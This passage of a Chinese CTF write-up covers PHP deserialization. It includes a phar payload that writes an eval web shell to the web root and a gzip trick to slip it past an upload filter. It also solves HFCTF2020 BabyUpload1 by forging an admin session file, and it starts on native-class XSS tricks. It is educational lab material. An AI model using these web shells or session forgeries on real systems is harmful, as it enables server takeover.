<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#666">&lt;?</span>php
</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">Flag</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#b8860b">$cmd</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$a</span><span style="color:#666">=</span><span style="color:#a2f;font-weight:bold">new</span> Flag();
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$a</span><span style="color:#666">-&gt;</span><span style="color:#b44">cmd</span><span style="color:#666">=</span><span style="color:#b44">&#34;echo </span><span style="color:#b62;font-weight:bold">\&#34;</span><span style="color:#b44">&lt;?=@eval(</span><span style="color:#b62;font-weight:bold">\\\$</span><span style="color:#b44">_POST[&#39;a&#39;]);</span><span style="color:#b62;font-weight:bold">\&#34;</span><span style="color:#b44">&gt;/var/www/html/1.php&#34;</span>; <span style="color:#080;font-style:italic">//将eval执行的内容写入1.php
</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span><span style="color:#b8860b">$phar</span> <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> Phar(<span style="color:#b44">&#34;test.phar&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$phar</span><span style="color:#666">-&gt;</span><span style="color:#b44">startBuffering</span>();
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$phar</span><span style="color:#666">-&gt;</span><span style="color:#b44">setStub</span>(<span style="color:#b44">&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$phar</span><span style="color:#666">-&gt;</span><span style="color:#b44">setMetadata</span>(<span style="color:#b8860b">$a</span>);
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$phar</span><span style="color:#666">-&gt;</span><span style="color:#b44">addFromString</span>(<span style="color:#b44">&#34;test.txt&#34;</span>, <span style="color:#b44">&#34;test&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$phar</span><span style="color:#666">-&gt;</span><span style="color:#b44">stopBuffering</span>();
</span></span></code></pre></div><p>运行php代码后可以在目录下看到生成的phar文件
<p class="markdown-image">
  <img src="/img/33.png" alt="alt text"  />
</p></p>
<p>将该phar文件上传发现无回显，修改后缀为jpg后出现正则匹配
<p class="markdown-image">
  <img src="/img/32.png" alt="alt text"  />
</p></p>
<p>利用gzip命令压缩绕过
<p class="markdown-image">
  <img src="/img/35.png" alt="alt text"  />
</p></p>
<p>压缩后将生成的test.phar.gz重命名为test.jpg再上传就能得到：
<p class="markdown-image">
  <img src="/img/34.png" alt="alt text"  />
</p></p>
<p>那么就可以通过phar伪协议post：
<p class="markdown-image">
  <img src="/img/36.png" alt="alt text"  />
</p></p>
<p>上传成功后访问刚刚的1.php,通过a来写系统命令:
<p class="markdown-image">
  <img src="/img/37.png" alt="alt text"  />
</p></p>
<p>得到flag:
<p class="markdown-image">
  <img src="/img/38.png" alt="alt text"  />
</p></p>
<p><strong>SESSION反序列化</strong></p>
<ol>
<li><strong>session相关组件解释：</strong></li>
</ol>
<ul>
<li>session_start()</li>
</ul>
<p>session_start()函数是启动新会话或者重用现有会话的第一步。</p>
<ul>
<li>sess_PHPSESSID</li>
</ul>
<p>sess_PHPSESSID是Cookie名称的一个常见示例，用于存储Session ID。这个名称可以在php.ini配置文件中通过session.name指令进行自定义。</p>
<ul>
<li>Set-Cookie</li>
</ul>
<p>Set-Cookie是一个HTTP响应头部，用于向客户端发送Cookie。</p>
<ul>
<li>$_SESSION</li>
</ul>
<p>$_SESSION是一个超全局变量，存储与Session ID相关联的Session数据，允许php脚本访问和修改这些数据。</p>
<ol start="2">
<li><strong>原理</strong></li>
</ol>
<p>当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会依据客户端传来的PHPSESSID来获取现有的对应的会话数据（即session文件）， PHP 会自动反序列化session文件的内容，并将之填充到 $_SESSION 超级全局变量中。</p>
<p>如果不存在对应的会话数据，则创建名为sess_PHPSESSID(客户端传来的)的文件。如果客户端未发送PHPSESSID，则创建一个由32个字母组成的PHPSESSID，并返回set-cookie。</p>
<p>而之所以能利用session反序列化，是因为session序列化和反序列化时的引擎不同</p>
<ol start="3">
<li><strong>PHP Session在php.ini中相关配置项</strong></li>
</ol>
<table>
<thead>
<tr>
<th style="text-align:center">配置项</th>
<th style="text-align:center">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">session.save_handler</td>
<td style="text-align:center">设定用户自定义session存储函数,默认为files</td>
</tr>
<tr>
<td style="text-align:center">session.save_path</td>
<td style="text-align:center">设置session存储路径，默认在/tmp</td>
</tr>
<tr>
<td style="text-align:center">session.serialize_handler</td>
<td style="text-align:center">设定(反)序列化处理器,默认为php</td>
</tr>
<tr>
<td style="text-align:center">session.auto_start</td>
<td style="text-align:center">指定会话模块是否在请求开始时启动一个会话，默认为0不启动</td>
</tr>
<tr>
<td style="text-align:center">session.upload_progress.enabed</td>
<td style="text-align:center">将上传文件的进度信息存储在session中。默认开启</td>
</tr>
<tr>
<td style="text-align:center">session.upload_progress.cleanup</td>
<td style="text-align:center">一旦读取了所有的POST数据，立即清除进度信息。默认开启</td>
</tr>
</tbody>
</table>
<p><p class="markdown-image">
  <img src="/img/41.png" alt="alt text"  />
</p></p>
<ol start="4">
<li><strong>Session 三种序列化方式</strong></li>
</ol>
<table>
<thead>
<tr>
<th style="text-align:center">存储引擎</th>
<th style="text-align:center">存储方式</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">php_binary</td>
<td style="text-align:center">键名的长度对应的 ASCII 字符 + 键名 + 经过 serialize() 函数序列化处理的值</td>
</tr>
<tr>
<td style="text-align:center">php</td>
<td style="text-align:center">键名 + 竖线 + 经过 serialize() 函数序列处理的值</td>
</tr>
<tr>
<td style="text-align:center">php_serialize</td>
<td style="text-align:center">(PHP&gt;5.5.4) 经过 serialize() 函数序列化处理的数组</td>
</tr>
</tbody>
</table>
<p><strong>[HFCTF2020]BabyUpload1</strong></p>
<p>题目源码：</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#666">&lt;?</span>php
</span></span><span style="display:flex;"><span>error_reporting(<span style="color:#666">0</span>);
</span></span><span style="display:flex;"><span>session_save_path(<span style="color:#b44">&#34;/var/babyctf/&#34;</span>);
</span></span><span style="display:flex;"><span>session_start();
</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">require_once</span> <span style="color:#b44">&#34;/flag&#34;</span>;
</span></span><span style="display:flex;"><span>highlight_file(<span style="color:#800">__FILE__</span>);
</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">if</span>(<span style="color:#b8860b">$_SESSION</span>[<span style="color:#b44">&#39;username&#39;</span>] <span style="color:#666">===</span><span style="color:#b44">&#39;admin&#39;</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#b8860b">$filename</span><span style="color:#666">=</span><span style="color:#b44">&#39;/var/babyctf/success.txt&#39;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">if</span>(file_exists(<span style="color:#b8860b">$filename</span>)){
</span></span><span style="display:flex;"><span>            safe_delete(<span style="color:#b8860b">$filename</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">die</span>(<span style="color:#b8860b">$flag</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">else</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#b8860b">$_SESSION</span>[<span style="color:#b44">&#39;username&#39;</span>] <span style="color:#666">=</span><span style="color:#b44">&#39;guest&#39;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$direction</span> <span style="color:#666">=</span> filter_input(INPUT_POST, <span style="color:#b44">&#39;direction&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$attr</span> <span style="color:#666">=</span> filter_input(INPUT_POST, <span style="color:#b44">&#39;attr&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$dir_path</span> <span style="color:#666">=</span> <span style="color:#b44">&#34;/var/babyctf/&#34;</span><span style="color:#666">.</span><span style="color:#b8860b">$attr</span>;
</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">if</span>(<span style="color:#b8860b">$attr</span><span style="color:#666">===</span><span style="color:#b44">&#34;private&#34;</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#b8860b">$dir_path</span> <span style="color:#666">.=</span> <span style="color:#b44">&#34;/&#34;</span><span style="color:#666">.</span><span style="color:#b8860b">$_SESSION</span>[<span style="color:#b44">&#39;username&#39;</span>];
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">if</span>(<span style="color:#b8860b">$direction</span> <span style="color:#666">===</span> <span style="color:#b44">&#34;upload&#34;</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">try</span>{
</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span>(<span style="color:#666">!</span>is_uploaded_file(<span style="color:#b8860b">$_FILES</span>[<span style="color:#b44">&#39;up_file&#39;</span>][<span style="color:#b44">&#39;tmp_name&#39;</span>])){
</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">throw</span> <span style="color:#a2f;font-weight:bold">new</span> RuntimeException(<span style="color:#b44">&#39;invalid upload&#39;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#b8860b">$file_path</span> <span style="color:#666">=</span> <span style="color:#b8860b">$dir_path</span><span style="color:#666">.</span><span style="color:#b44">&#34;/&#34;</span><span style="color:#666">.</span><span style="color:#b8860b">$_FILES</span>[<span style="color:#b44">&#39;up_file&#39;</span>][<span style="color:#b44">&#39;name&#39;</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#b8860b">$file_path</span> <span style="color:#666">.=</span> <span style="color:#b44">&#34;_&#34;</span><span style="color:#666">.</span>hash_file(<span style="color:#b44">&#34;sha256&#34;</span>,<span style="color:#b8860b">$_FILES</span>[<span style="color:#b44">&#39;up_file&#39;</span>][<span style="color:#b44">&#39;tmp_name&#39;</span>]);
</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span>(preg_match(<span style="color:#b44">&#39;/(\.\.\/|\.\.\\\\)/&#39;</span>, <span style="color:#b8860b">$file_path</span>)){
</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">throw</span> <span style="color:#a2f;font-weight:bold">new</span> RuntimeException(<span style="color:#b44">&#39;invalid file path&#39;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#666">@</span>mkdir(<span style="color:#b8860b">$dir_path</span>, <span style="color:#666">0700</span>, <span style="color:#a2f;font-weight:bold">TRUE</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span>(move_uploaded_file(<span style="color:#b8860b">$_FILES</span>[<span style="color:#b44">&#39;up_file&#39;</span>][<span style="color:#b44">&#39;tmp_name&#39;</span>],<span style="color:#b8860b">$file_path</span>)){
</span></span><span style="display:flex;"><span>            <span style="color:#b8860b">$upload_result</span> <span style="color:#666">=</span> <span style="color:#b44">&#34;uploaded&#34;</span>;
</span></span><span style="display:flex;"><span>        }<span style="color:#a2f;font-weight:bold">else</span>{
</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">throw</span> <span style="color:#a2f;font-weight:bold">new</span> RuntimeException(<span style="color:#b44">&#39;error while saving&#39;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    } <span style="color:#a2f;font-weight:bold">catch</span> (RuntimeException <span style="color:#b8860b">$e</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#b8860b">$upload_result</span> <span style="color:#666">=</span> <span style="color:#b8860b">$e</span><span style="color:#666">-&gt;</span><span style="color:#b44">getMessage</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>} <span style="color:#a2f;font-weight:bold">elseif</span> (<span style="color:#b8860b">$direction</span> <span style="color:#666">===</span> <span style="color:#b44">&#34;download&#34;</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">try</span>{
</span></span><span style="display:flex;"><span>        <span style="color:#b8860b">$filename</span> <span style="color:#666">=</span> basename(filter_input(INPUT_POST, <span style="color:#b44">&#39;filename&#39;</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#b8860b">$file_path</span> <span style="color:#666">=</span> <span style="color:#b8860b">$dir_path</span><span style="color:#666">.</span><span style="color:#b44">&#34;/&#34;</span><span style="color:#666">.</span><span style="color:#b8860b">$filename</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span>(preg_match(<span style="color:#b44">&#39;/(\.\.\/|\.\.\\\\)/&#39;</span>, <span style="color:#b8860b">$file_path</span>)){
</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">throw</span> <span style="color:#a2f;font-weight:bold">new</span> RuntimeException(<span style="color:#b44">&#39;invalid file path&#39;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span>(<span style="color:#666">!</span>file_exists(<span style="color:#b8860b">$file_path</span>)) {
</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">throw</span> <span style="color:#a2f;font-weight:bold">new</span> RuntimeException(<span style="color:#b44">&#39;file not exist&#39;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        header(<span style="color:#b44">&#39;Content-Type: application/force-download&#39;</span>);
</span></span><span style="display:flex;"><span>        header(<span style="color:#b44">&#39;Content-Length: &#39;</span><span style="color:#666">.</span>filesize(<span style="color:#b8860b">$file_path</span>));
</span></span><span style="display:flex;"><span>        header(<span style="color:#b44">&#39;Content-Disposition: attachment; filename=&#34;&#39;</span><span style="color:#666">.</span>substr(<span style="color:#b8860b">$filename</span>, <span style="color:#666">0</span>, <span style="color:#666">-</span><span style="color:#666">65</span>)<span style="color:#666">.</span><span style="color:#b44">&#39;&#34;&#39;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span>(readfile(<span style="color:#b8860b">$file_path</span>)){
</span></span><span style="display:flex;"><span>            <span style="color:#b8860b">$download_result</span> <span style="color:#666">=</span> <span style="color:#b44">&#34;downloaded&#34;</span>;
</span></span><span style="display:flex;"><span>        }<span style="color:#a2f;font-weight:bold">else</span>{
</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">throw</span> <span style="color:#a2f;font-weight:bold">new</span> RuntimeException(<span style="color:#b44">&#39;error while saving&#39;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    } <span style="color:#a2f;font-weight:bold">catch</span> (RuntimeException <span style="color:#b8860b">$e</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#b8860b">$download_result</span> <span style="color:#666">=</span> <span style="color:#b8860b">$e</span><span style="color:#666">-&gt;</span><span style="color:#b44">getMessage</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">exit</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#080">?&gt;</span><span style="">
</span></span></span></code></pre></div><p>进行代码审计</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">if</span>(<span style="color:#b8860b">$_SESSION</span>[<span style="color:#b44">&#39;username&#39;</span>] <span style="color:#666">===</span><span style="color:#b44">&#39;admin&#39;</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#b8860b">$filename</span><span style="color:#666">=</span><span style="color:#b44">&#39;/var/babyctf/success.txt&#39;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">if</span>(file_exists(<span style="color:#b8860b">$filename</span>)){
</span></span><span style="display:flex;"><span>            safe_delete(<span style="color:#b8860b">$filename</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">die</span>(<span style="color:#b8860b">$flag</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>由以上代码可以知道获得flag条件：</p>
<ol>
<li>
<p>username === &lsquo;admin&rsquo;</p>
</li>
<li>
<p>存在success.txt文件</p>
</li>
</ol>
<p>再来看upload和download两个功能：</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">if</span>(<span style="color:#b8860b">$direction</span> <span style="color:#666">===</span> <span style="color:#b44">&#34;upload&#34;</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">try</span>{
</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span>(<span style="color:#666">!</span>is_uploaded_file(<span style="color:#b8860b">$_FILES</span>[<span style="color:#b44">&#39;up_file&#39;</span>][<span style="color:#b44">&#39;tmp_name&#39;</span>])){
</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">throw</span> <span style="color:#a2f;font-weight:bold">new</span> RuntimeException(<span style="color:#b44">&#39;invalid upload&#39;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#b8860b">$file_path</span> <span style="color:#666">=</span> <span style="color:#b8860b">$dir_path</span><span style="color:#666">.</span><span style="color:#b44">&#34;/&#34;</span><span style="color:#666">.</span><span style="color:#b8860b">$_FILES</span>[<span style="color:#b44">&#39;up_file&#39;</span>][<span style="color:#b44">&#39;name&#39;</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#b8860b">$file_path</span> <span style="color:#666">.=</span> <span style="color:#b44">&#34;_&#34;</span><span style="color:#666">.</span>hash_file(<span style="color:#b44">&#34;sha256&#34;</span>,<span style="color:#b8860b">$_FILES</span>[<span style="color:#b44">&#39;up_file&#39;</span>][<span style="color:#b44">&#39;tmp_name&#39;</span>]);
</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span>(preg_match(<span style="color:#b44">&#39;/(\.\.\/|\.\.\\\\)/&#39;</span>, <span style="color:#b8860b">$file_path</span>)){
</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">throw</span> <span style="color:#a2f;font-weight:bold">new</span> RuntimeException(<span style="color:#b44">&#39;invalid file path&#39;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#666">@</span>mkdir(<span style="color:#b8860b">$dir_path</span>, <span style="color:#666">0700</span>, <span style="color:#a2f;font-weight:bold">TRUE</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span>(move_uploaded_file(<span style="color:#b8860b">$_FILES</span>[<span style="color:#b44">&#39;up_file&#39;</span>][<span style="color:#b44">&#39;tmp_name&#39;</span>],<span style="color:#b8860b">$file_path</span>)){
</span></span><span style="display:flex;"><span>            <span style="color:#b8860b">$upload_result</span> <span style="color:#666">=</span> <span style="color:#b44">&#34;uploaded&#34;</span>;
</span></span><span style="display:flex;"><span>        }<span style="color:#a2f;font-weight:bold">else</span>{
</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">throw</span> <span style="color:#a2f;font-weight:bold">new</span> RuntimeException(<span style="color:#b44">&#39;error while saving&#39;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    } <span style="color:#a2f;font-weight:bold">catch</span> (RuntimeException <span style="color:#b8860b">$e</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#b8860b">$upload_result</span> <span style="color:#666">=</span> <span style="color:#b8860b">$e</span><span style="color:#666">-&gt;</span><span style="color:#b44">getMessage</span>();
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>upload可以上传文件到/var/babyctf/目录下，上传后的文件名在末尾加上了哈希值，同时也有一些过滤，不过没啥影响。</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">elseif</span> (<span style="color:#b8860b">$direction</span> <span style="color:#666">===</span> <span style="color:#b44">&#34;download&#34;</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">try</span>{
</span></span><span style="display:flex;"><span>        <span style="color:#b8860b">$filename</span> <span style="color:#666">=</span> basename(filter_input(INPUT_POST, <span style="color:#b44">&#39;filename&#39;</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#b8860b">$file_path</span> <span style="color:#666">=</span> <span style="color:#b8860b">$dir_path</span><span style="color:#666">.</span><span style="color:#b44">&#34;/&#34;</span><span style="color:#666">.</span><span style="color:#b8860b">$filename</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span>(preg_match(<span style="color:#b44">&#39;/(\.\.\/|\.\.\\\\)/&#39;</span>, <span style="color:#b8860b">$file_path</span>)){
</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">throw</span> <span style="color:#a2f;font-weight:bold">new</span> RuntimeException(<span style="color:#b44">&#39;invalid file path&#39;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span>(<span style="color:#666">!</span>file_exists(<span style="color:#b8860b">$file_path</span>)) {
</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">throw</span> <span style="color:#a2f;font-weight:bold">new</span> RuntimeException(<span style="color:#b44">&#39;file not exist&#39;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        header(<span style="color:#b44">&#39;Content-Type: application/force-download&#39;</span>);
</span></span><span style="display:flex;"><span>        header(<span style="color:#b44">&#39;Content-Length: &#39;</span><span style="color:#666">.</span>filesize(<span style="color:#b8860b">$file_path</span>));
</span></span><span style="display:flex;"><span>        header(<span style="color:#b44">&#39;Content-Disposition: attachment; filename=&#34;&#39;</span><span style="color:#666">.</span>substr(<span style="color:#b8860b">$filename</span>, <span style="color:#666">0</span>, <span style="color:#666">-</span><span style="color:#666">65</span>)<span style="color:#666">.</span><span style="color:#b44">&#39;&#34;&#39;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span>(readfile(<span style="color:#b8860b">$file_path</span>)){
</span></span><span style="display:flex;"><span>            <span style="color:#b8860b">$download_result</span> <span style="color:#666">=</span> <span style="color:#b44">&#34;downloaded&#34;</span>;
</span></span><span style="display:flex;"><span>        }<span style="color:#a2f;font-weight:bold">else</span>{
</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">throw</span> <span style="color:#a2f;font-weight:bold">new</span> RuntimeException(<span style="color:#b44">&#39;error while saving&#39;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    } <span style="color:#a2f;font-weight:bold">catch</span> (RuntimeException <span style="color:#b8860b">$e</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#b8860b">$download_result</span> <span style="color:#666">=</span> <span style="color:#b8860b">$e</span><span style="color:#666">-&gt;</span><span style="color:#b44">getMessage</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">exit</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>download可以读取var/babyctf/目录下任意文件filename</p>
<p>wp:</p>
<p>首先先传direction=download，F12得到session值</p>
<p><p class="markdown-image">
  <img src="/img/42.png" alt="alt text"  />
</p></p>
<p><em>session文件命名方式为sess_PHPSESSID</em>,此时可以传filename查看session文件</p>
<p><p class="markdown-image">
  <img src="/img/43.png" alt="alt text"  />
</p></p>
<p>反序列化内容既没有<code>|</code>也没有<code>{}</code>,判断是采用php_binary的存储方式，修改php.ini让本地php环境支持php_binary，<del>记得重启Apache</del></p>
<p><p class="markdown-image">
  <img src="/img/44.png" alt="alt text"  />
</p></p>
<p>然后本地编写脚本上传admin信息</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#666">&lt;?</span>php
</span></span><span style="display:flex;"><span>session_start();
</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">if</span>(isset(<span style="color:#b8860b">$_GET</span>[<span style="color:#b44">&#39;name&#39;</span>])){
</span></span><span style="display:flex;"><span>	<span style="color:#b8860b">$_SESSION</span>[<span style="color:#b44">&#39;username&#39;</span>]<span style="color:#666">=</span><span style="color:#b8860b">$_GET</span>[<span style="color:#b44">&#39;name&#39;</span>];
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#080">?&gt;</span><span style="">
</span></span></span></code></pre></div><p>运行代码传?name=admin后在tmp目录可以看到生成了对应session文件</p>
<p><p class="markdown-image">
  <img src="/img/45.png" alt="alt text"  />
</p></p>
<p>修改文件名为sess并计算该文件的哈希值：</p>
<p><p class="markdown-image">
  <img src="/img/46.png" alt="alt text"  />
</p></p>
<blockquote>
<p>432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</p>
</blockquote>
<p>编写上传代码上传admin的sess文件：</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#666">&lt;</span>form action<span style="color:#666">=</span><span style="color:#b44">&#34;http://0beb395b-65d0-4163-90d0-7ddeb1ecb427.node4.buuoj.cn:81/&#34;</span> method<span style="color:#666">=</span><span style="color:#b44">&#34;post&#34;</span> enctype<span style="color:#666">=</span><span style="color:#b44">&#34;multipart/form-data&#34;</span><span style="color:#666">&gt;</span>
</span></span><span style="display:flex;"><span>  file<span style="color:#666">:</span> <span style="color:#666">&lt;</span>input type<span style="color:#666">=</span><span style="color:#b44">&#34;file&#34;</span> name<span style="color:#666">=</span><span style="color:#b44">&#34;up_file&#34;</span><span style="color:#666">/&gt;&lt;</span>br<span style="color:#666">&gt;</span> 
</span></span><span style="display:flex;"><span>  <span style="color:#666">&lt;</span>input type<span style="color:#666">=</span><span style="color:#b44">&#34;submit&#34;</span> value<span style="color:#666">=</span><span style="color:#b44">&#34;Send&#34;</span><span style="color:#666">/&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#666">&lt;</span>input type<span style="color:#666">=</span><span style="color:#b44">&#34;text&#34;</span> name<span style="color:#666">=</span><span style="color:#b44">&#34;direction&#34;</span> value<span style="color:#666">=</span><span style="color:#b44">&#34;upload&#34;</span><span style="color:#666">/&gt;&lt;</span>br<span style="color:#666">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#666">&lt;</span>input type<span style="color:#666">=</span><span style="color:#b44">&#34;text&#34;</span> name<span style="color:#666">=</span><span style="color:#b44">&#34;attr&#34;</span> value<span style="color:#666">=</span><span style="color:#b44">&#34;&#34;</span><span style="color:#666">/&gt;&lt;</span>br<span style="color:#666">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#666">&lt;/</span>form<span style="color:#666">&gt;</span>
</span></span></code></pre></div><p>上传成功后只需要改cookie值为admin登陆时的cookie：
<p class="markdown-image">
  <img src="/img/47.png" alt="alt text"  />
</p></p>
<p>最后传参时加上attr=succcess.txt就可以拿到flag啦~~</p>
<p><p class="markdown-image">
  <img src="/img/48.png" alt="alt text"  />
</p></p>
<p><strong>PHP原生类序列化</strong></p>
<p>下面简单介绍ctf中常见原生类及部分类用法：</p>
<blockquote>
<p>Error/Exception类</p>
</blockquote>
<blockquote>
<p>SoapClient类</p>
</blockquote>
<blockquote>
<p>DirectoryIterator/FilesystemIterator类</p>
</blockquote>
<blockquote>
<p>SplFileObject类</p>
</blockquote>
<blockquote>
<p>SimpleXMLElement</p>
</blockquote>
<blockquote>
<p>ZipArchive类</p>
</blockquote>
<ol>
<li>Error/Exception类的利用</li>
</ol>
<ul>
<li>Error XSS:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#666">&lt;?</span>php  
</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">echo</span> unserialize(<span style="color:#b8860b">$_GET</span>[<span style="color:#b44">&#39;cmd&#39;</span>]);  
</span></span><span style="display:flex;"><span><span style="color:#080">?&gt;</span><span style="">
</span></span></span></code></pre></div><p>使用Error类可以用来弹xss:</p>
